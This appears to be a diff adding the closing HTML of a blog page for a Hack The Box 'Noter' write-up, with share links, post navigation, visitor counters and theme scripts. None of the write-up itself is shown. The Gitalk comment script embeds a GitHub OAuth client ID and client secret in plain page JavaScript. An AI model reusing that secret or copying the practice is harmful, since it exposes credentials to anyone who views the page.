+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/&title=《Noter - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/&title=《Noter - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Noter - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">StreamIO - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/05/05/TryHackMe/TryHackMe-Overpass/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Overpass - TryHackMe</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/&title=《Noter - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/&title=《Noter - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Noter - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACq0lEQVR42u3aS27jQAwFQN//0s42i0h+/LShAKVVkBlLXR1ApB/79Yqv98X1+1/zT119tveUhQsPDw9vaen5g68ef/+b+7tdrTBfMx4eHt5p3tVN73+ebFN1ofka8PDw8J7Gm2xEtdjcbwoeHh7ef+Elr+98O6ptNB4eHt5zeNUINX+tVzclb6mXsxY8PDy8mJdPkZ7z85H5Hh4eHt54qt4bhjUb39vi8W5deHh4eCd4vWig2rz2Rly9woCHh4f3HV7yUu5FEgkgiRvWxmB4eHh4Y16y3Lyp3Rqn5YXnw3Px8PDwDvCSYX9yOKB3yGBeDO7/Jx4eHt4JXv5VPykVk+MC5XBhMrXDw8PDG/MmjXUvfp0fz4rWg4eHh3eY1xtNzRviagwxSqbx8PDwlnjNDCMegG3dIS8hfwzA8PDw8L7Iy7/d521xNWjoBc14eHh453jVD8+D4GqTnbfseHh4eKd51eA1j317mGSbmuMxPDw8vMO8XnNcjW4nh66qkQceHh7eFq/3mGqRmIy7esezoqwFDw8Pb8DbGtX3gonJMOxDecDDw8M7xsuXmx812G21lw9d4eHh4Q14ySt7wu6N03oDuULigoeHh7fEy4OG+YypOu7K2/fo74aHh4e3ytsKDqplpho95OMxPDw8vBO83lCqF2pUD2nlZWZU8fDw8PAGvN7t5ge28tFX+TgCHh4e3mFeNcCtHoqqvrFf8wsPDw9vlfcuXvOYNd/QvDxcbhkeHh7eAV7vHVsNBarN8WjQNS8heHh4eOPOM1lizu5tR1IYyik1Hh4e3pjXG2tVS8XxZAUPDw/vkbw8XJgfFMjDjsu74eHh4T2GN298qwWjuU14eHh4x3i9Y0/Jq3wS9SbDragw4OHh4a3ytr7R51FF9ajWaOl4eHh4m7wf5HZK35lslOsAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
